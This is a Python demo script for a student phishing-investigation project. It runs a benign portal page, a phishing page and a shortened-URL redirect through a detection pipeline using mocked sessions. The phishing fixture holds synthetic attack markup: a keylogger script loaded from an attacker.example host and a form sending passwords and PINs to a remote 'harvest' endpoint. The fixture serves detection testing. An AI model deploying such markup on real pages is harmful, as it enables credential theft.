"""
Demonstration script for College Mini-Project:
AI-Based Multi-Stage Phishing Investigation & Attack Correlation System.

Demonstrates independent components, multi-stage evidence correlation,
and two primary investigation scenarios:
1. Benign Normal Page (University Portal)
2. Malicious Phishing Page (Multi-indicator Attack)
3. Conflicting / Ambiguous Page (Shortened URL / Benign Destination)

Safe to run offline: uses synthetic HTML and mocked network sessions.
"""

from unittest.mock import MagicMock, patch
import json
import requests

from src.model import predict
from src.webpage_agent import analyze_webpage
from src.behaviour_agent import analyze_behaviour
from src.correlation_agent import correlate_evidence, investigate_url


def create_mock_response(status_code: int, url: str, location: str | None = None):
    resp = MagicMock(spec=requests.Response)
    resp.status_code = status_code
    resp.url = url
    resp.headers = {"Location": location} if location else {}
    return resp


# ---------------------------------------------------------
# Synthetic HTML Fixtures
# ---------------------------------------------------------

NORMAL_PAGE_HTML = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>University Student Portal - Login</title>
    <script src="/static/js/bundle.js"></script>
</head>
<body>
    <header>
        <h1>Apex University Student Portal</h1>
        <nav>
            <a href="/courses">Courses</a>
            <a href="/calendar">Academic Calendar</a>
            <a href="/help">Student Helpdesk</a>
        </nav>
    </header>
    <main>
        <h2>Sign In to Your Account</h2>
        <!-- Benign form submitting to local relative path -->
        <form action="/auth/login" method="post">
            <label for="student_id">Student ID:</label>
            <input type="text" id="student_id" name="student_id" required>

            <label for="password">Password:</label>
            <input type="password" id="password" name="password" required>

            <input type="hidden" name="csrf_token" value="sec_token_98472918">
            <button type="submit">Log In</button>
        </form>
    </main>
    <footer>
        <p>&copy; 2026 Apex University. All rights reserved.</p>
    </footer>
</body>
</html>
"""

PHISHING_ATTACK_HTML = """
<!DOCTYPE html>
<html lang="en">
<head>
    <title>Urgent Security Verification</title>
    <!-- External script loaded from untrusted hostname -->
    <script src="http://untrusted-scripts.attacker.example/keylogger.js"></script>
</head>
<body>
    <h2>Security Alert: Immediate Account Verification Required</h2>
    <p>Your access will be suspended within 24 hours unless you re-authenticate.</p>

    <!-- Credential harvesting form submitting to external domain -->
    <form action="https://data-collector.attacker.example/harvest" method="post">
        <label>Account Email:</label>
        <input type="text" name="email" value="user@university.edu">

        <label>Current Password:</label>
        <input type="password" name="account_password" placeholder="Enter password">

        <label>Confirm PIN:</label>
        <input type="password" name="security_pin">

        <input type="hidden" name="campaign_id" value="phish_camp_01">
        <input type="hidden" name="victim_ip" value="captured_client">
        <button type="submit">Verify Now</button>
    </form>

    <!-- External tracking iframe -->
    <iframe src="https://stealth-tracker.attacker.example/pixel" width="1" height="1"></iframe>
</body>
</html>
"""

BENIGN_STUDY_NOTES_HTML = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Physics 101 - Lecture Study Notes</title>
</head>
<body>
    <header>
        <h1>Physics 101: Mechanics Study Notes</h1>
        <p>Shared open courseware repository.</p>
    </header>
    <main>
        <p>Review of Newton's laws, energy conservation, and angular momentum.</p>
        <a href="/downloads/lecture-notes.pdf">Download Lecture PDF</a>
    </main>
    <footer>
        <p>&copy; 2026 Academic Open Access</p>
    </footer>
</body>
</html>
"""


def run_demo():
    print("=" * 78)
    print(" AI-BASED MULTI-STAGE PHISHING INVESTIGATION SYSTEM - DEMONSTRATION")
    print("=" * 78)

    # -----------------------------------------------------
    # SCENARIO 1: BENIGN UNIVERSITY PORTAL
    # -----------------------------------------------------
    print("\n" + "-" * 78)
    print(" [SCENARIO 1] Investigating Benign Webpage (Normal University Portal)")
    print("-" * 78)
    url_normal = "https://apex-university.example/student/login"

    # Mock clean behaviour (direct 200 OK)
    mock_session_normal = MagicMock(spec=requests.Session)
    mock_session_normal.get.return_value = create_mock_response(200, url_normal)

    with patch("src.features.fetch_html", return_value=NORMAL_PAGE_HTML):
        report_normal = investigate_url(
            url=url_normal,
            html=NORMAL_PAGE_HTML,
            include_behaviour=True,
            behaviour_session=mock_session_normal
        )

    print(f"Target URL:         {report_normal['target_url']}")
    print(f"Overall Risk Level: {report_normal['overall_risk'].upper()}")
    print(f"Risk Score:         {report_normal['risk_score']:.2f} / 1.00")
    print(f"Confidence:         {report_normal['confidence'].upper()}")
    print(f"Summary:            {report_normal['summary']}")
    print("Primary Reasons:")
    for reason in report_normal["reasons"][:3]:
        print(f"  * {reason}")
    print(f"Supporting Signals: {len(report_normal['supporting_indicators'])}")
    print(f"Conflicting Signs:  {len(report_normal['conflicting_indicators'])}")

    # -----------------------------------------------------
    # SCENARIO 2: MULTI-STAGE PHISHING ATTACK
    # -----------------------------------------------------
    print("\n" + "-" * 78)
    print(" [SCENARIO 2] Investigating Multi-Indicator Phishing Attack Page")
    print("-" * 78)
    url_phish = "http://urgent-verify.security-notice.example:8080/login"

    # Mock suspicious behaviour: cross-domain redirect with protocol downgrade
    mock_session_phish = MagicMock(spec=requests.Session)
    mock_session_phish.get.side_effect = [
        create_mock_response(302, url_phish, "http://insecure-redirect.attacker.example/verify"),
        create_mock_response(200, "http://insecure-redirect.attacker.example/verify")
    ]

    with patch("src.features.fetch_html", return_value=PHISHING_ATTACK_HTML):
        report_phish = investigate_url(
            url=url_phish,
            html=PHISHING_ATTACK_HTML,
            include_behaviour=True,
            behaviour_session=mock_session_phish
        )

    print(f"Target URL:         {report_phish['target_url']}")
    print(f"Overall Risk Level: {report_phish['overall_risk'].upper()}")
    print(f"Risk Score:         {report_phish['risk_score']:.2f} / 1.00")
    print(f"Confidence:         {report_phish['confidence'].upper()}")
    print(f"Summary:            {report_phish['summary']}")
    print("Observed Attack Indicators (Deduplicated):")
    for item in report_phish["deduplicated_evidence"]:
        print(f"  * [{item['source_agent']}] {item['observation']}")
        print(f"    --> Inference: {item['inference']}")
    print("Corroborating Multi-Stage Signals:")
    for sup in report_phish["supporting_indicators"]:
        print(f"  [+] {sup}")

    # -----------------------------------------------------
    # SCENARIO 3: CONFLICTING SIGNALS (URL SHORTENER)
    # -----------------------------------------------------
    print("\n" + "-" * 78)
    print(" [SCENARIO 3] Investigating Ambiguous Case with Conflicting Evidence")
    print("-" * 78)
    url_short = "https://short.example/study-notes"
    url_dest = "https://open-library.example/physics-notes"

    # Cross-domain redirect to benign destination
    mock_session_short = MagicMock(spec=requests.Session)
    mock_session_short.get.side_effect = [
        create_mock_response(302, url_short, url_dest),
        create_mock_response(200, url_dest)
    ]

    with patch("src.features.fetch_html", return_value=BENIGN_STUDY_NOTES_HTML):
        report_short = investigate_url(
            url=url_short,
            html=BENIGN_STUDY_NOTES_HTML,
            include_behaviour=True,
            behaviour_session=mock_session_short
        )

    print(f"Target URL:         {report_short['target_url']}")
    print(f"Overall Risk Level: {report_short['overall_risk'].upper()}")
    print(f"Risk Score:         {report_short['risk_score']:.2f} / 1.00")
    print("Conflicting Signals Detected:")
    for conflict in report_short["conflicting_indicators"]:
        print(f"  [!] {conflict}")

    print("\n" + "=" * 78)
    print(" DEMONSTRATION COMPLETE: All components executed safely offline.")
    print("=" * 78)


if __name__ == "__main__":
    run_demo()
